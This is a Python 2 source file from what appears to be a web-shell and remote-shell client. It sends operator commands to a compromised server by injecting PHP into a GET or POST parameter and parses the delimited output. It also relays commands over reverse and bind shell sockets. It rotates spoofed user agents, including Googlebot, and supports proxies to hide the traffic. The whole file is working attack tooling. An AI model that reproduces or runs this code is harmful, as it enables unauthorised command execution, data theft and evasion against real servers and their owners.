from httplib import InvalidURL
from random import randint
from urllib import urlencode, quote
from urllib2 import ProxyHandler, build_opener, install_opener, HTTPError

from core.libs.listen_handler import listen
from core.libs.connect_handler import connect

from core.libs.menu import getargs
from core.libs.thirdparty.termcolor import colored
from core.libs.thirdparty.termcolor import cprint

import re
import time


USER_AGENTS = [
        "curl/7.7.2 (powerpc-apple-darwin6.0) libcurl 7.7.2 (OpenSSL 0.9.6b)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 1.0.5)",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101213 Firefox/4.0b8pre",
        "Mozilla/5.0 (X11; U; Linux amd64; en-US; rv:5.0) Gecko/20110619 Firefox/5.0",
        "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00",
        "Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
        "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.6.30 Version/10.61",
        ]


class MakeRequest(object):
    '''
    Check for the used method POST or GET
    Adding some commands to cmd requires updating
    self.info in TargetBox class 'target_info.py'
    '''
    def __init__(self, url=None, method='get', parameter=None):
        self.url = getargs.url
        self.method = getargs.method
        self.parameter = getargs.parameter
        self.proxy = getargs.proxy
        self.user_agent = getargs.agent
        self.random_agent = getargs.random_agent

    def get_page_source(self, cmd):
        self.cmd = cmd
        result = re.search(';sudo ', self.cmd)
        if result:
            command = self.cmd.replace('sudo', '{0}sudo{1}'.format('\033[91m', '\033[93m'))
            errmsg = colored('\n[!] Warning this command ({0}) could break the connection. I\'m not going to allow it to be sent'.format(command), 'red')
            cprint(errmsg, 'red')

        elif getargs.url:
            # Proxy support
            proxy_support = ProxyHandler({'http': self.proxy} if self.proxy else {})
            opener = build_opener(proxy_support)

            # User angent
            if self.random_agent:
                opener.addheaders = [('User-agent', USER_AGENTS[randint(0, len(USER_AGENTS) - 1)])]
            elif self.user_agent:
                opener.addheaders = [('User-agent', self.user_agent)]
            else:
                pass
            install_opener(opener)

            errmsg = colored('\n[!] Check your network connection and/or the proxy (if you\'re using one)', 'red')
            fourzerofourmsg = colored('\n[!] Please make sure the page (\'{0}\') requested exists!'.format(self.url), 'red')

            # Check if the method is POST
            if self.method == 'post' or self.parameter:
                self.method = 'post'
                parameters = urlencode({self.parameter: 'error_reporting(0);echo ::command_start::;' + self.cmd.strip(';') + ';echo ::command_end::;'})
                try:
                    sc = map(str.rstrip, opener.open(self.url, parameters).readlines())
                    sc =  '::command_deli::'.join(sc)
                    sc = re.search('::command_start::(.+)::command_end::', sc)
                    if sc:
                        sc = sc.group(1).split('::command_deli::')[1:-1]
                    else:
                        parameters = urlencode({self.parameter: self.cmd.strip(';')})
                        sc = map(str.rstrip, opener.open(self.url, parameters).readlines())
                    return sc
                except InvalidURL:
                    exit(errmsg)
#                except:
#                    exit(fourzerofourmsg)

            # If the used method set GET
            else:
                try:
                    sc = map(str.rstrip, opener.open('{0}{1}'.format(self.url, quote('error_reporting(0);echo ::command_start::;' +self.cmd.strip(';')+';echo ::command_end::;'))).readlines())
                    sc =  '::command_deli::'.join(sc)
                    sc = re.search('::command_start::(.+)::command_end::', sc)
                    if sc:
                        sc = sc.group(1).split('::command_deli::')[1:-1]
                    else:
                        sc = map(str.rstrip, opener.open('{0}{1}'.format(self.url, quote(self.cmd.strip(';')))).readlines())

                    return sc
                except InvalidURL:
                    exit(errmsg)
                except HTTPError:
                    cprint('[!] This is a 414 error code and you need to work with a POST method', 'red')
                    exit()

        elif getargs.listen:
            try:
                if (listen.socket.sendall(cmd + "\n") != None):
                    errmsg = colored('\n[!] Error in sending data (#1)', 'red')
                    cprint(errmsg, 'red')
                time.sleep(0.1)

                sc = ''
                buffer = listen.socket.recv(1024)

                if buffer == '':
                    errmsg = colored('\n[!] Lost connection. Exiting...', 'red')
                    cprint(errmsg, 'red')
                    listen.socket.close()
                    exit(1)
                while buffer != '':
                    sc = sc + buffer     # sc +=+ buffer # convert " to '
                    try:
                        buffer = listen.socket.recv(1024)
                    except:
                        buffer = ''
                return sc.split('\n')[:-1]
            except:
                if(listen.socket.sendall(cmd + "\n") != None):
                    errmsg = colored('\n[!] [!] Error in sending data (#2)', 'red')
                    cprint(errmsg, 'red')
                pass
        elif getargs.connect:
            try:
                if (connect.socket.send(cmd + "\n") == None):
                    errmsg = colored('\n[!] Error in sending data (#1)', 'red')
                    cprint(errmsg, 'red')
                time.sleep(0.1)

                sc = ''
                buffer = connect.socket.recv(1024)

                if buffer == '':
                    errmsg = colored('\n[!] Lost connection. Exiting...', 'red')
                    cprint(errmsg, 'red')
                    connect.socket.close()
                    exit(1)
                while buffer != '':
                    sc = sc + buffer
                    try:
                        buffer = connect.socket.recv(1024)
                    except:
                        buffer = ''

                return sc.split('\n')[:-1]
            except:
                pass
        else:
            errmsg = colored('\n[!] Unsupported mode!', 'red')
            cprint(errmsg, 'red')
            exit(1)

make_request = MakeRequest()
